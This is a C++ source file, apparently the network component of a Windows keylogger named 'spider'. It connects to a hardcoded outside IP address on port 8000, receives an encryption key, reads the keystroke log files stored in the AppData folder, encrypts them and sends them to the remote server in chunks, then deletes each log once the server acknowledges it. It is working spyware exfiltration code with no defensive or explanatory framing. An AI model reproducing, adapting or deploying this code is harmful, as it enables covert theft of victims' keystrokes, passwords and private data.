#include "stdafx.h"

#include <fstream>
#include <cstdio>
#include <iostream>
#include <string>
#include <algorithm> // remove(), erase() 
#include <boost/array.hpp>
#include <boost/asio.hpp>
#include <Windows.h>
#include <shlobj.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#include <thread>    
#include <chrono> 
#include "Comunication.h"
#include "EOpenSSL.hpp"
#include "KeyLogger.h"

const int max_length = 1024;

Comunication::Comunication() :
	key(""), enc(static_cast<spider::AEncryption *>(new spider::EOpenSSL()))
{

}

Comunication::~Comunication()
{

}

int				Comunication::check_recv(boost::asio::ip::tcp::socket &socket)
{
	boost::array<char, 4098> buf;
	boost::system::error_code error;
	std::string message;

	size_t len = socket.read_some(boost::asio::buffer(buf), error);
	message = std::string(buf.data(), buf.data() + static_cast<int>(len));
	if (!message.empty() && len >= 4 && message[0] == '0'
		&& message[1] == '0' && message[2] == '0' && message[3] == '2')
		return (0);
	else
		return (1);

}


void			Comunication::send_parts(std::string &file, boost::asio::ip::tcp::socket &socket)
{
	int			i = 0; //start
	std::string	result;
	std::string encrypted;
	
	while (i + 245 < file.size())
	{
		result = file.substr(i, 245);
		encrypted = this->enc->encrypt(result);
		i += 245;
		boost::asio::write(socket, boost::asio::buffer(encrypted, std::strlen(encrypted.c_str()) + 1));
		std::cout << encrypted << std::endl;
		if (check_recv(socket) == 0)
		{
			std::cout << "passons a la partie suivante" << std::endl;
		}
	}
	result = file.substr((i), (file.size() % 245));
	encrypted = this->enc->encrypt(result);
	boost::asio::write(socket, boost::asio::buffer(encrypted, std::strlen(encrypted.c_str()) + 1));
	if (check_recv(socket) == 0)
	{
		std::cout << "fin du fichier" << std::endl;
	}
}

std::string		Comunication::read_one_file(std::ifstream &myfile, boost::asio::ip::tcp::socket &socket)
{
	std::string line;
	std::string file;

	if (myfile)
	{
		while (std::getline(myfile, line))
		{
			file.append(line);
			file.append("\n");
		}
	}
	file.append("\0");
	return (file);
}

void			Comunication::send_files(boost::asio::ip::tcp::socket &socket)
{
	std::ifstream myfile;
	std::string file;
	std::string path = KeyLogger::getAppDataFolder();
	std::string basic_path;
	std::string file_path;

	basic_path = path;
	basic_path.append("*log.spider");
	WIN32_FIND_DATAA ffd;
	HANDLE hfile = FindFirstFileA(basic_path.c_str(), &ffd);
	if (check_recv(socket) == 0)
	{
		std::cout << "Accept du 0002" << std::endl;
	}
	do
	{
		if (!socket.is_open())
			this->connect();
		boost::asio::write(socket, boost::asio::buffer("0004\n", 5));
		if (check_recv(socket) == 0)
		{
			std::cout << "Accept du 0004" << std::endl;
		}
		file_path = path;
		file_path.append(ffd.cFileName);
		myfile.open(file_path);
		file = read_one_file(myfile, socket);
		send_parts(file, socket);
		boost::asio::write(socket, boost::asio::buffer("0005\n", 5));
		if (check_recv(socket) == 0)
		{
			std::cout << "Accept du 0005" << std::endl;
			myfile.close();
			DeleteFile(file_path.c_str());
		}
	} while (FindNextFileA(hfile, &ffd));
		FindClose(hfile);
}

int			Comunication::get_key(size_t len)
{
	int			i = static_cast<int>(len);
	int			j;

	if (!key.empty() && len >= 4 && key[0] == '0'
		&& key[1] == '0' && key[2] == '0' && key[3] == '1')
	{
		j = 0;
		while (key[j] && key[j] != '\n')
			j++;
		j++;
		key.erase(key.begin(), key.begin() + j);
		if (key[0] == '0'  && key[1] == '0' && key[2] == '0' && key[3] == '6')
			key.erase(key.begin(), key.begin() + 5);
		key.append("\n");
		std::cout << key << std::endl;
		return (0);
	}
	return (1);
}

bool			Comunication::connect()
{
	try
	{
		boost::asio::io_service io_service;
		boost::asio::ip::tcp::resolver resolver(io_service);
		boost::asio::ip::tcp::resolver::query query("5.135.179.18", "8000");
		boost::asio::ip::tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
		boost::asio::ip::tcp::socket	socket(io_service);
		boost::array<char, 4098> buf;
		boost::system::error_code error;

		boost::asio::connect(socket, endpoint_iterator);
		size_t len = socket.read_some(boost::asio::buffer(buf), error);
		if (error)
			throw boost::system::system_error(error); // Some other error.
		key = std::string(buf.data(), buf.data() + static_cast<int>(len));
		if (get_key(len) == 0)
			boost::asio::write(socket, boost::asio::buffer("0002\n", 5));
		this->enc->init(key);
		send_files(socket); 
	}
	catch (std::exception& e)
	{
		std::cerr << e.what() << std::endl;
		return false;
	}
}

void			Comunication::run()
{
	connect();
}